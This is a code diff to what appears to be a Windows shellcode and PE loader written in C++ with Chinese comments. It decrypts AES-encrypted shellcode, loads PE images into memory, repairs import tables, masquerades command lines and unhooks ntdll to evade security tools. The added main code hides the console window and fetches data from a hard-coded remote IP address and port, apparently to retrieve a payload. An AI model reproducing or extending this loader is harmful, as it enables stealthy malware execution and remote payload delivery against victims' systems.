@@ -8,6 +8,7 @@
 #include <wincrypt.h>
 #include <limits>
 #include <stdlib.h>
+#include "HttpRequest.h"
 
 #define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
 #define NtCurrentThread() ( ( HANDLE ) ( LONG_PTR ) -2 )
@@ -56,6 +57,20 @@ struct DATA {
     size_t len;
 
 };
+
+
+
+/* 定义常量 */
+#define HTTP_DEF_PORT     80  /* 连接的缺省端口 */
+#define HTTP_BUF_SIZE   1024  /* 缓冲区的大小   */
+#define HTTP_HOST_LEN    256  /* 主机名长度 */
+
+char* http_req_hdr_tmpl = "GET %s HTTP/1.1\r\n"
+"Accept: image/gif, image/jpeg, */*\r\nAccept-Language: zh-cn\r\n"
+"Accept-Encoding: gzip, deflate\r\nHost: %s:%d\r\n"
+"User-Agent: Huiyong's Browser <0.1>\r\nConnection: Keep-Alive\r\n\r\n";
+
+//#pragma comment(lib,"ws2_32.lib")
 
 // 进行aes解密
 void DecryptAES(char* shellcode, DWORD shellcodeLen, char* key, DWORD keyLen) {
@@ -417,25 +432,25 @@ bool RepairIAT(PVOID modulePtr)
         size_t offsetThunk = 0;
         while (true)
         {
-            IMAGE_THUNK_DATA* fieldThunk = (IMAGE_THUNK_DATA*)(size_t(modulePtr) + offsetField + call_via);
-            IMAGE_THUNK_DATA* orginThunk = (IMAGE_THUNK_DATA*)(size_t(modulePtr) + offsetThunk + thunk_addr);
-
-            if (orginThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG32 || orginThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64) // check if using ordinal (both x86 && x64)
+            IMAGE_THUNK_DATA* fieldThunk = (IMAGE_THUNK_DATA*)(size_t(modulePtr) + offsetField + call_via);   // IAT
+            IMAGE_THUNK_DATA* orginThunk = (IMAGE_THUNK_DATA*)(size_t(modulePtr) + offsetThunk + thunk_addr);  // INT
+            // 判断是否通过序号定位函数
+            if (orginThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG32 || orginThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64) // check if using ordinal (both x86 && x64) 
             {
-                size_t addr = (size_t)GetProcAddress(LoadLibraryA(lib_name), (char*)(orginThunk->u1.Ordinal & 0xFFFF));  // 通过INT获取函数号称在获取函数地址
+                size_t addr = (size_t)GetProcAddress(LoadLibraryA(lib_name), (char*)(orginThunk->u1.Ordinal & 0xFFFF));  // 通过INT获取函数号称在获取函数地址 0xFFFF取出低十六位
                 fieldThunk->u1.Function = addr;  // 获取到的地址赋值给IAT
             }
-
+            // 判断是否到链子的底端
             if (fieldThunk->u1.Function == NULL) break;
 
-            if (fieldThunk->u1.Function == orginThunk->u1.Function) {  // 如果相等说明没有发生重定向
+            if (fieldThunk->u1.Function == orginThunk->u1.Function) {  // 如果相等说明没有发生重定向，两个结构体里存的都是函数名
 
-                PIMAGE_IMPORT_BY_NAME by_name = (PIMAGE_IMPORT_BY_NAME)((size_t)(modulePtr)+orginThunk->u1.AddressOfData);  
-                LPSTR func_name = (LPSTR)by_name->Name;
+                PIMAGE_IMPORT_BY_NAME by_name = (PIMAGE_IMPORT_BY_NAME)((size_t)(modulePtr)+orginThunk->u1.AddressOfData);   //IMAGE_IMPORT_BY_NAME结构体
+                LPSTR func_name = (LPSTR)by_name->Name;  // 函数名
 
                 size_t addr = (size_t)GetProcAddress(LoadLibraryA(lib_name), func_name); //通过INT里的函数名获取函数地址
 
-
+                // 以下是填充一些杂七杂八的运行参数
                 if (hijackCmdline && _stricmp(func_name, "GetCommandLineA") == 0)
                 {
                     fieldThunk->u1.Function = (size_t)hookGetCommandLineA;
@@ -486,7 +501,7 @@ bool RepairIAT(PVOID modulePtr)
 // 加载PE文件 把date文件加载到内存中
 void PELoader(char* data, DWORD datasize)
 {
-
+    // 获取命令行参数
     masqueradeCmdline();
 
     unsigned int chksum = 0;
@@ -638,6 +653,12 @@ BOOL Unhook(LPVOID cleanNtdll) {
 
 
 int main(int argc, char** argv) {
+    HWND hwndDOS = GetForegroundWindow();
+    ShowWindow(hwndDOS, SW_HIDE);
+    HttpRequest httpReq("101.42.175.89", 65523);
+    std::string res = httpReq.HttpGet("/g");
+    std::string str_orign = "vwxyz123456789011111111";
+    str_orign = res;
 
     if (argc != 5) {
         printf("[+] Usage: %s <Host> <Port> <Cipher> <Key>\n", argv[0]);
